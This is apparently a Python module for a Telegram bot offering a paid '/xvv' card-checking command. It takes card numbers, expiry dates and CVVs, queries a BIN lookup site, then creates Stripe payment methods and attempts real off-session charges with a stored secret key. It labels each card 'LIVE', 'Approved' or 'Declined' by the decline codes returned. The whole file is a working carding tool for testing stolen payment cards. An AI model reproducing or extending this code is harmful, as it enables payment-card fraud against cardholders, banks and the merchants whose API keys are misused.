import time
import re
import requests
import json
from EQUROBOT  import app
from EQUROBOT.core.mongo import has_premium_access
from pyrogram import filters
import aiohttp
from collections import defaultdict
from requests.exceptions import RequestException
from EQUROBOT.modules import sk_set
from config import OWNER_ID


AMOUNT = 4
USER_REQUEST_TIMES = defaultdict(list)
CARD_PATTERN = re.compile(r"(\d{15,16})[|/:](\d{2})[|/:](\d{2,4})[|/:](\d{3,4})")

async def get_bin_info(bin_number):
    url = f"https://bins.antipublic.cc/bins/{bin_number}"
    connector = aiohttp.TCPConnector(ssl=False)

    async with aiohttp.ClientSession(connector=connector) as session:
        try:
            async with session.get(url) as response:
                if response.status == 200:
                    bin_info = await response.json()
                    return (
                        bin_info.get("brand", "N/A"),
                        bin_info.get("type", "N/A"),
                        bin_info.get("level", "N/A"),
                        bin_info.get("bank", "N/A"),
                        bin_info.get("country_name", "N/A"),
                        bin_info.get("country_flag", ""),
                    )
                return "Error fetching BIN info", "N/A", "N/A", "N/A", "N/A", "N/A"
        except aiohttp.ClientError:
            return "Error parsing BIN info", "N/A", "N/A", "N/A", "N/A", "N/A"

async def check_card(card_info, message):
    card = card_info.split("|")
    if len(card) != 4 or not all(card):
        return "Invalid card details. Please use the format: card_number|mm|yy|cvv"

    start_time = time.time()
    card_list = card_info.split(",")

    results = []
    for card in card_list:
        split = card.split("|")
        cc, mes, ano, cvv = (split + [""] * 4)[:4]

        if not all([cc, mes, ano, cvv]):
            results.append(f"❌ **Invalid card details** for `{card}`")
            continue

        token_data = {
            'type': 'card',
            "card[number]": cc,
            "card[exp_month]": mes,
            "card[exp_year]": ano,
            "card[cvc]": cvv,
        }

        try:
            response = requests.post(
                "https://api.stripe.com/v1/payment_methods",
                data=token_data,
                headers={
                    "Authorization": f"Bearer {sk_set.pk}",
                    "Content-Type": "application/x-www-form-urlencoded",
                },
            )
        except RequestException as e:
            results.append(f"❌ **Error with card `{cc}`: {str(e)}**")
            continue

        bin_info = await get_bin_info(cc[:6])
        brand, card_type, level, bank, country, flag = bin_info

        if response.status_code != 200:
            try:
                error_message = response.json().get("error", {}).get("message", "Unknown error")
            except json.JSONDecodeError:
                error_message = "Unknown error"

            resp = f"{error_message} for `{card}`"
            if cc.startswith("6"):
                resp = "Your card is not supported."

            results.append(
                f"𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌\n\n"
                f"𝗖𝗮𝗿𝗱: `{cc}|{mes}|{ano}|{cvv}`\n"
                f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆: SK Based 1$ XVV\n"
                f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: {resp}\n\n"
                f"𝗜𝗻𝗳𝗼: {brand.upper()} - {card_type.upper()} - {level.upper()}\n"
                f"𝗜𝘀𝘀𝘂𝗲𝗿: {bank.upper()} 🏛\n"
                f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}\n\n"
                f"𝗧𝗶𝗺𝗲: `{round(time.time() - start_time, 2)}` Seconds\n"
                f"𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆: [{message.from_user.first_name}](tg://user?id={message.from_user.id})"
            )
            continue

        token_data = response.json()
        token_id = token_data.get("id", "")

        if not token_id:
            results.append(f"❌ **Token creation failed** for `{card}`")
            continue

        charge_data = {
            "amount": AMOUNT * 100,
            "currency": "usd",
            'payment_method_types[]': 'card',
            "description": "Charge for product/service",
            'payment_method': token_id,
            'confirm': 'true',
            'off_session': 'true'
        }

        try:
            response = requests.post(
                "https://api.stripe.com/v1/payment_intents",
                data=charge_data,
                headers={
                    "Authorization": f"Bearer {sk_set.sk}",
                    "Content-Type": "application/x-www-form-urlencoded",
                },
            )
        except RequestException as e:
            results.append(f"❌ **Charge error** for `{cc}`: {str(e)}")
            continue
            
        charges = response.text

        try:
            charges_dict = json.loads(charges)
            charge_error = charges_dict.get("error", {}).get("decline_code", "Unknown error")
            charge_message = charges_dict.get("error", {}).get("message", "No message available")
        except json.JSONDecodeError:
            charge_error = "Unknown error (Invalid JSON response)"
            charge_message = "No message available"
            
        elapsed_time = round(time.time() - start_time, 2)

        if '"seller_message": "Payment complete."' in charges:
            status = "Approved ✅"
            resp = "Charged 1$🔥"
        elif '"cvc_check": "pass"' in charges:
            status = "LIVE ✅"
            resp = "CVV Live"
        elif "generic_decline" in charges:
            status = "Declined ❌"
            resp = "Generic Decline"
        elif "insufficient_funds" in charges:
            status = "LIVE ✅"
            resp = "Insufficient funds 💰"
        elif "fraudulent" in charges:
            status = "Declined ❌"
            resp = "Fraudulent"
        elif "do_not_honor" in charges:
            status = "Declined ❌"
            resp = "Do Not Honor"
        elif '"code": "incorrect_cvc"' in charges:
            status = "LIVE ✅"
            resp = "Security code (CVC) is Incorrect."
        elif "invalid_expiry_month" in charges:
            status = "Declined ❌"
            resp = "The card expiration date provided is invalid."
        elif "invalid_account" in charges:
            status = "Declined ❌"
            resp = "The account linked to the card is invalid."
        elif "lost_card" in charges:
            status = "Declined ❌"
            resp = "The card has been reported as lost and the transaction was declined."
        elif "stolen_card" in charges:
            status = "Declined ❌"
            resp = "The card has been reported as stolen and the transaction was declined."
        elif "transaction_not_allowed" in charges:
            status = "CCN LIVE ✅"
            resp = "Transaction Not Allowed"
        elif "authentication_required" in charges or "card_error_authentication_required" in charges:
            status = "LIVE ✅"
            resp = "3D Secured"
        elif "pickup_card" in charges:
            status = "Declined ❌"
            resp = "Pickup Card"
        elif "Your card has expired." in charges:
            status = "Declined ❌"
            resp = "Expired Card"
        elif "card_decline_rate_limit_exceeded" in charges:
            status = "Declined ❌"
            resp = "Rate limit"
        elif '"code": "processing_error"' in charges:
            status = "Declined ❌"
            resp = "Processing error"
        elif '"message": "Your card number is incorrect."' in charges:
            status = "Declined ❌"
            resp = "Your card number is incorrect."
        elif "incorrect_number" in charges:
            status = "Declined ❌"
            resp = "Card number is invalid."
        elif "testmode_charges_only" in charges:
            status = "Declined ❌"
            resp = "The SK key is in test mode or invalid. Please use a valid key."
        elif "api_key_expired" in charges:
            status = "Declined ❌"
            resp = "The API key used for the transaction has expired."
        elif "parameter_invalid_empty" in charges:
            status = "Declined ❌"
            resp = "Please enter valid card details to check."
        else:
            status = f"{charge_error}"
            resp = f"{charge_message}"

        results.append(
            f"{status}\n\n"
            f"𝗖𝗮𝗿𝗱 ⇾ `{cc}|{mes}|{ano}|{cvv}`\n"
            f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ SK Based 1$ XVV\n"
            f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {resp}\n\n"
            f"𝗜𝗻𝗳𝗼 ⇾ {brand} - {card_type} - {level}\n"
            f"𝗜𝘀𝘀𝘂𝗲𝗿 ⇾ {bank} 🏛\n"
            f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ⇾ {country} {flag}\n\n"
            f"𝗧𝗶𝗺𝗲 ⇾ {elapsed_time:.2f} **Seconds**\n"
            f"𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 ⇾ [{message.from_user.first_name}](tg://user?id={message.from_user.id})"
        )

    return "\n".join(results)



@app.on_message(filters.command("xvv", prefixes=[".", "/", "!"]))
async def handle_check_card(client, message):
    user_id = message.from_user.id
    
    if not await has_premium_access(message.from_user.id) and message.from_user.id != OWNER_ID:
        return await message.reply_text("You don't have premium access. Contact my owner to purchase premium.")

    

    try:
        card_info = message.text.split(maxsplit=1)[1].strip()
    except IndexError:
        await message.reply(
            "Please provide the card details in the format: `card_number|mm|yy|cvv`"
        )
        return

    if not CARD_PATTERN.match(card_info):
        await message.reply(
            "Please provide the card details in the format: `card_number|mm|yy|cvv`"
        )
        return

    if not sk_set.sk or not sk_set.pk:
        await message.reply("Secret keys are not set. Please set them first.")
        return

    processing_msg = await message.reply("Processing your request...")

    try:
        response = await check_card(card_info, message)
        await processing_msg.edit_text(response)
    except Exception as e:
        await processing_msg.edit_text(f"An error occurred: {str(e)}")
